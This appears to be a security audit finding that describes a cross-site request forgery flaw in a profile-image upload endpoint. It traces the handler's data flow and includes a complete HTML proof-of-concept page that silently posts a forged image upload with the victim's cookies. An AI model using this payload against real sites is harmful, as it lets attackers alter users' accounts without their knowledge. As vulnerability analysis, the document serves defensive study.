analysis:
The `profileImageFileUpload` handler processes profile image file uploads for authenticated users via `POST /profile/image/file`.

Data Flow:
- Source: An untrusted HTTP request is received with an ambient authentication cookie `req.cookies.token` (line 34).
- Defective Validation / Sanitization: The endpoint performs state-changing actions (writing a file to `frontend/dist/frontend/assets/public/images/uploads/` and updating the user's `profileImage` field in the database via `UserModel.update`) relying solely on the ambient session cookie `req.cookies.token`. There is no anti-CSRF token verification, nor is there any validation of the `Origin` or `Referer` headers.
- Sink: `await fs.writeFile(filePath, buffer)` (line 42) and `await user.update({ profileImage: ... })` (line 50).

Conceptual Exploit Payload:
An attacker hosts a malicious web page that automatically issues a cross-origin multipart POST request with credentials:
```html
<!DOCTYPE html>
<html>
<body>
<script>
  const imageBase64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
  const byteCharacters = atob(imageBase64);
  const byteNumbers = new Array(byteCharacters.length);
  for (let i = 0; i < byteCharacters.length; i++) {
    byteNumbers[i] = byteCharacters.charCodeAt(i);
  }
  const byteArray = new Uint8Array(byteNumbers);
  const blob = new Blob([byteArray], { type: 'image/png' });

  const formData = new FormData();
  formData.append('file', blob, 'exploit.png');

  fetch('http://localhost:3000/profile/image/file', {
    method: 'POST',
    body: formData,
    credentials: 'include'
  });
</script>
</body>
</html>
```
When a logged-in user visits the attacker's page, the browser attaches the `token` cookie in the cross-origin request. `security.authenticatedUsers.get(req.cookies.token)` authenticates the request, overwriting the victim's profile image on disk and in the database without victim consent or knowledge.

